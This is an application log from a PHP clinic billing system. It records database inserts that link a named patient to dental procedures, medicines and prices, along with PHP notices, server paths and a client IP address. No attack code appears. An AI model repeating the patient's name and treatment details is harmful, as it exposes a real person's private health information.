+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','0.9%氯化钠注射液','4.02',NULL,'0','2018-07-04 11:07:30','12941') [ RunTime:0.0018s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='过氧化氢溶液' and isdel=1 ) LIMIT 1   [ RunTime:0.0056s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','过氧化氢溶液','7',NULL,'0','2018-07-04 11:07:30','13506') [ RunTime:0.0016s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='颌间固定拆除术' and isdel=1 ) LIMIT 1   [ RunTime:0.0008s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','颌间固定拆除术','123',NULL,'0','2018-07-04 11:07:30','1485') [ RunTime:0.0014s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='充填体抛光术' and isdel=1 ) LIMIT 1   [ RunTime:0.0011s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','充填体抛光术','68',NULL,'0','2018-07-04 11:07:31','2378') [ RunTime:0.0014s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='口腔护理' and isdel=1 ) LIMIT 1   [ RunTime:0.0023s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','口腔护理','9',NULL,'0','2018-07-04 11:07:31','5129') [ RunTime:0.0015s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='（中原口腔）数字化摄影（DR)' and isdel=1 ) LIMIT 1   [ RunTime:0.0071s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','（中原口腔）数字化摄影（DR)','28',NULL,'0','2018-07-04 11:07:31','0') [ RunTime:0.0015s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='（中原口腔）数字化摄影（DR)' and isdel=1 ) LIMIT 1   [ RunTime:0.0071s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','（中原口腔）数字化摄影（DR)','28',NULL,'0','2018-07-04 11:07:31','0') [ RunTime:0.0019s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='（中原口腔）数字化摄影（DR)' and isdel=1 ) LIMIT 1   [ RunTime:0.0071s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','（中原口腔）数字化摄影（DR)','28',NULL,'0','2018-07-04 11:07:31','0') [ RunTime:0.0184s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='根管长度测量' and isdel=1 ) LIMIT 1   [ RunTime:0.0012s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','根管长度测量','8.800000000000001',NULL,'0','2018-07-04 11:07:31','2351') [ RunTime:0.0015s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='根管充填术' and isdel=1 ) LIMIT 1   [ RunTime:0.0012s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','根管充填术','31',NULL,'0','2018-07-04 11:07:31','2386') [ RunTime:0.0014s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='口腔局部冲洗上药' and isdel=1 ) LIMIT 1   [ RunTime:0.0011s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','口腔局部冲洗上药','7.8',NULL,'0','2018-07-04 11:07:31','2365') [ RunTime:0.0089s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='橡皮障隔湿法' and isdel=1 ) LIMIT 1   [ RunTime:0.0011s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','橡皮障隔湿法','17',NULL,'0','2018-07-04 11:07:31','2379') [ RunTime:0.0023s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='口腔护理' and isdel=1 ) LIMIT 1   [ RunTime:0.0022s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','口腔护理','9',NULL,'0','2018-07-04 11:07:31','5129') [ RunTime:0.0016s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='高速手机制备术' and isdel=1 ) LIMIT 1   [ RunTime:0.0071s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','高速手机制备术','40',NULL,'0','2018-07-04 11:07:31','0') [ RunTime:0.0037s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='简单充填术' and isdel=1 ) LIMIT 1   [ RunTime:0.0012s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','简单充填术','42',NULL,'0','2018-07-04 11:07:31','2445') [ RunTime:0.0016s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='（中原口腔)楔线' and isdel=1 ) LIMIT 1   [ RunTime:0.0071s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','（中原口腔)楔线','37.8',NULL,'0','2018-07-04 11:07:31','0') [ RunTime:0.0015s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='根管长度测量' and isdel=1 ) LIMIT 1   [ RunTime:0.0011s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','根管长度测量','8.800000000000001',NULL,'0','2018-07-04 11:07:31','2351') [ RunTime:0.0014s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='根管充填术' and isdel=1 ) LIMIT 1   [ RunTime:0.0012s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','根管充填术','31',NULL,'0','2018-07-04 11:07:31','2386') [ RunTime:0.0014s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='口腔局部冲洗上药' and isdel=1 ) LIMIT 1   [ RunTime:0.0011s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','口腔局部冲洗上药','7.8',NULL,'0','2018-07-04 11:07:31','2365') [ RunTime:0.0019s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='高速手机制备术' and isdel=1 ) LIMIT 1   [ RunTime:0.0072s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','高速手机制备术','40',NULL,'0','2018-07-04 11:07:31','0') [ RunTime:0.0013s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='简单充填术' and isdel=1 ) LIMIT 1   [ RunTime:0.0012s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','简单充填术','42',NULL,'0','2018-07-04 11:07:31','2445') [ RunTime:0.0014s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='（中原口腔）数字化摄影（DR)' and isdel=1 ) LIMIT 1   [ RunTime:0.0071s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','（中原口腔）数字化摄影（DR)','28',NULL,'0','2018-07-04 11:07:31','0') [ RunTime:0.0014s ]
+NOTIC: [8] Undefined index: C /usr/share/nginx/html/App/Home/Controller/WordController.class.php 第 103 行.
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='（中原口腔）特殊' and isdel=1 ) LIMIT 1   [ RunTime:0.0071s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('0b6ffe9efc2b8febde297176fc26345a','29.2','（中原口腔）特殊','29.2',NULL,'1','2018-07-04 11:07:31','0') [ RunTime:0.0015s ]
+NOTIC: [8] Undefined index: C /usr/share/nginx/html/App/Home/Controller/WordController.class.php 第 103 行.
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='（中原口腔）特殊' and isdel=1 ) LIMIT 1   [ RunTime:0.0071s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('0b6ffe9efc2b8febde297176fc26345a','29.2','（中原口腔）特殊','12.9',NULL,'1','2018-07-04 11:07:31','0') [ RunTime:0.0014s ]
+NOTIC: [8] Undefined index: C /usr/share/nginx/html/App/Home/Controller/WordController.class.php 第 103 行.
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='（中原口腔）曲面断' and isdel=1 ) LIMIT 1   [ RunTime:0.0071s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('0b6ffe9efc2b8febde297176fc26345a','29.2','（中原口腔）曲面断','40',NULL,'1','2018-07-04 11:07:31','0') [ RunTime:0.0014s ]
+NOTIC: [8] Undefined index: C /usr/share/nginx/html/App/Home/Controller/WordController.class.php 第 103 行.
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='（中原口腔）使用数' and isdel=1 ) LIMIT 1   [ RunTime:0.0071s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('0b6ffe9efc2b8febde297176fc26345a','29.2','（中原口腔）使用数','60',NULL,'1','2018-07-04 11:07:31','0') [ RunTime:0.0014s ]
+NOTIC: [8] Undefined index: C /usr/share/nginx/html/App/Home/Controller/WordController.class.php 第 103 行.
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='（中原口腔）复合' and isdel=1 ) LIMIT 1   [ RunTime:0.0071s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('0b6ffe9efc2b8febde297176fc26345a','29.2','（中原口腔）复合','870',NULL,'1','2018-07-04 11:07:31','0') [ RunTime:0.0013s ]
+NOTIC: [8] Undefined index: C /usr/share/nginx/html/App/Home/Controller/WordController.class.php 第 103 行.
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='（中原口腔）特殊' and isdel=1 ) LIMIT 1   [ RunTime:0.0071s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('0b6ffe9efc2b8febde297176fc26345a','29.2','（中原口腔）特殊','42',NULL,'1','2018-07-04 11:07:31','0') [ RunTime:0.0014s ]
+NOTIC: [8] Undefined index: C /usr/share/nginx/html/App/Home/Controller/WordController.class.php 第 103 行.
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='（中原口腔）口腔' and isdel=1 ) LIMIT 1   [ RunTime:0.0071s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('0b6ffe9efc2b8febde297176fc26345a','29.2','（中原口腔）口腔','15.8',NULL,'1','2018-07-04 11:07:31','0') [ RunTime:0.0014s ]
+NOTIC: [8] Undefined index: C /usr/share/nginx/html/App/Home/Controller/WordController.class.php 第 103 行.
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='（中原口腔）特殊' and isdel=1 ) LIMIT 1   [ RunTime:0.0071s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('0b6ffe9efc2b8febde297176fc26345a','29.2','（中原口腔）特殊','42',NULL,'1','2018-07-04 11:07:31','0') [ RunTime:0.0013s ]
+NOTIC: [8] Undefined index: C /usr/share/nginx/html/App/Home/Controller/WordController.class.php 第 103 行.
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='（中原口腔)楔线' and isdel=1 ) LIMIT 1   [ RunTime:0.0072s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('0b6ffe9efc2b8febde297176fc26345a','29.2','（中原口腔)楔线','37.8',NULL,'1','2018-07-04 11:07:31','0') [ RunTime:0.0013s ]
+NOTIC: [8] Undefined index: C /usr/share/nginx/html/App/Home/Controller/WordController.class.php 第 103 行.
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='（中原口腔）口腔' and isdel=1 ) LIMIT 1   [ RunTime:0.0071s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('0b6ffe9efc2b8febde297176fc26345a','29.2','（中原口腔）口腔','15.8',NULL,'1','2018-07-04 11:07:31','0') [ RunTime:0.0024s ]
+NOTIC: [8] Undefined index: B /usr/share/nginx/html/App/Home/Controller/WordController.class.php 第 83 行.
+NOTIC: [8] Undefined index: iserr /usr/share/nginx/html/App/Home/Controller/WordController.class.php 第 52 行.
+NOTIC: [8] Undefined index: iserr /usr/share/nginx/html/App/Home/Controller/WordController.class.php 第 52 行.
+NOTIC: [8] Undefined index: iserr /usr/share/nginx/html/App/Home/Controller/WordController.class.php 第 52 行.
+
+[ 2018-07-04T11:07:32+08:00 ] 1.192.65.221 /word/getpatientlist?batchid=%5B%7B%22id%22%3A%226e44dd57748c98968f4e2918c54e41a8%22%7D%2C%7B%22id%22%3A%220b6ffe9efc2b8febde297176fc26345a%22%7D%2C%7B%22id%22%3A%222bc8cab72422927df46b74223c68c7e9%22%7D%5D&random=0.32605202192947546
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000117s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000047s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000106s ]
+SQL: SHOW COLUMNS FROM `md_patient_medicine` [ RunTime:0.0007s ]
+NOTIC: [8] Undefined variable: batchid /usr/share/nginx/html/App/Home/Controller/WordController.class.php 第 307 行.
+SQL: select distinct md_patient_medicine.*,s.medicine_name as name,s.medicine_rate from md_patient_medicine left join (select * from md_medicine where isdel=1) as s on md_patient_medicine.medicine_name=s.medicine_name where patient_batchid in ('6e44dd57748c98968f4e2918c54e41a8','0b6ffe9efc2b8febde297176fc26345a','2bc8cab72422927df46b74223c68c7e9') order by md_patient_medicine.sheetnum,md_patient_medicine.patient_batchid,md_patient_medicine.id [ RunTime:0.1721s ]
+
+[ 2018-07-04T11:07:49+08:00 ] 1.192.65.221 /word/editmedicine?batchids=[{"id":"6e44dd57748c98968f4e2918c54e41a8"},{"id":"0b6ffe9efc2b8febde297176fc26345a"},{"id":"2bc8cab72422927df46b74223c68c7e9"}]&ran=0.3228482607704032
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000125s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000044s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000100s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000066s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000125s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.002075s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.002136s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000049s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000096s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000062s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000135s ]
+
+[ 2018-07-04T11:07:49+08:00 ] 1.192.65.221 /word/getEditPatientMedical?batchids=%5B%7B%22id%22%3A%226e44dd57748c98968f4e2918c54e41a8%22%7D%2C%7B%22id%22%3A%220b6ffe9efc2b8febde297176fc26345a%22%7D%2C%7B%22id%22%3A%222bc8cab72422927df46b74223c68c7e9%22%7D%5D&random=0.12977250513296556
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000026s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000112s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000052s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000102s ]
+SQL: SELECT distinct t.medicine_name FROM md_patient_medicine t left join (select * from md_medicine where isdel=1) s on t.medicine_name=s.medicine_name WHERE s.id is null and t.patient_batchid IN ('6e44dd57748c98968f4e2918c54e41a8','0b6ffe9efc2b8febde297176fc26345a','2bc8cab72422927df46b74223c68c7e9') [ RunTime:0.1630s ]
+
+[ 2018-07-04T11:07:55+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000129s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000051s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000107s ]
+
+[ 2018-07-04T11:07:56+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000109s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000043s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000087s ]
+
+[ 2018-07-04T11:07:56+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000099s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000036s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000083s ]
+
+[ 2018-07-04T11:07:57+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000113s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000035s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000084s ]
+
+[ 2018-07-04T11:07:57+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000107s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000030s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000076s ]
+
+[ 2018-07-04T11:07:57+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000109s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000039s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000094s ]
+
+[ 2018-07-04T11:07:57+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000111s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000080s ]
+
+[ 2018-07-04T11:07:57+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000110s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000087s ]
+
+[ 2018-07-04T11:07:57+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000029s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000107s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000080s ]
+
+[ 2018-07-04T11:07:57+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000117s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000035s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000083s ]
+
+[ 2018-07-04T11:07:58+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000120s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000034s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000078s ]
+SQL: select * from md_medicine where medicine_name like '%锥体束%' and isdel=1 [ RunTime:0.0089s ]
+
+[ 2018-07-04T11:08:02+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000113s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000037s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000086s ]
+
+[ 2018-07-04T11:08:04+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000109s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000035s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000084s ]
+
+[ 2018-07-04T11:08:04+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000104s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000031s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000074s ]
+
+[ 2018-07-04T11:08:05+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000112s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000051s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000099s ]
+
+[ 2018-07-04T11:08:05+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000107s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000034s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000079s ]
+
+[ 2018-07-04T11:08:05+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000106s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000089s ]
+
+[ 2018-07-04T11:08:05+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000111s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000039s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000086s ]
+
+[ 2018-07-04T11:08:06+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000108s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000034s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000092s ]
+SQL: select * from md_medicine where medicine_name like '%数字化%' and isdel=1 [ RunTime:0.0096s ]
+
+[ 2018-07-04T11:08:10+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000113s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000037s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000085s ]
+
+[ 2018-07-04T11:08:13+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000117s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000037s ]
